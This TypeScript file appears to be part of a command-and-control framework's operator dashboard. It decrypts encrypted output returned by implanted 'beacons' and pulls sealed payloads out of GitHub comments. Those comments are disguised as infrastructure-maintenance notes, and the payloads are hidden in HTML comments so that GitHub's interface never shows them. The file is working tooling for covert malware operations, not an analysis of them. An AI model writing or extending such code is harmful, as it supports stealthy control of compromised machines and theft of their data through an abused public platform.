// dashboard/src/lib/crypto.ts
//
// Client-side result decryption.
// Beacons encrypt output with crypto_box_seal using the operator's public key.
// The operator's private key (base64url, from AuthContext.privkey) is used here
// to derive the public key and open the sealed box.
// Decrypted content never leaves the browser — no API call, no storage.

import sodium from 'libsodium-wrappers';
import { recoveryDropPath as sharedRecoveryDropPath } from '@octoc2/shared';

/**
 * Decrypt a libsodium sealed-box result produced by a beacon.
 *
 * @param data        Base64url-encoded sealed ciphertext (the `data` field from TaskResult)
 * @param privkeyB64  Operator private key, base64url-encoded, 32 bytes (from AuthContext.privkey)
 * @returns Decrypted plaintext as a UTF-8 string
 * @throws  If decryption fails (wrong key or corrupted data)
 */
export async function decryptSealedResult(data: string, privkeyB64: string): Promise<string> {
  await sodium.ready;

  const secretKey  = sodium.from_base64(privkeyB64.trim(), sodium.base64_variants.URLSAFE_NO_PADDING);
  // Derive public key from private key (Curve25519 scalar multiplication by base point)
  const publicKey  = sodium.crypto_scalarmult_base(secretKey);
  const ciphertext = sodium.from_base64(data.trim(), sodium.base64_variants.URLSAFE_NO_PADDING);

  let plain: Uint8Array;
  try {
    plain = sodium.crypto_box_seal_open(ciphertext, publicKey, secretKey);
  } catch {
    throw new Error('Decryption failed — wrong key or corrupted data');
  }
  if (!plain) throw new Error('Decryption failed — wrong key or corrupted data');

  return sodium.to_string(plain);
}

/**
 * Return the canonical signed-recovery drop path for a beacon.
 *
 * Re-exporting the shared implementation keeps the dashboard aligned with the
 * publisher and implant resolver instead of maintaining a second convention.
 */
export const recoveryDropPath = sharedRecoveryDropPath;

/**
 * Parse the sealed diagnostic payload from a maintenance comment body.
 *
 * The maintenance comment format (from MaintenanceComment.ts in the implant) is:
 *   <!-- infra-maintenance:UUID -->
 *   ...visible content...
 *   <!-- infra-diagnostic:UUID:<base64url-sealed-payload> -->
 *
 * The sealed payload is embedded inside the HTML comment so it is never visible
 * in GitHub's UI. Returns the base64url ciphertext or null if not found.
 *
 * @param commentBody - Raw GitHub comment body (may be null)
 */
export function parseMaintenanceDiagnosticPayload(commentBody: string | null): string | null {
  if (!commentBody) return null;
  const m = commentBody.match(/<!--\s*infra-diagnostic:[a-f0-9-]+:([A-Za-z0-9_\-+/=]+)\s*-->/);
  return m ? (m[1] ?? null) : null;
}
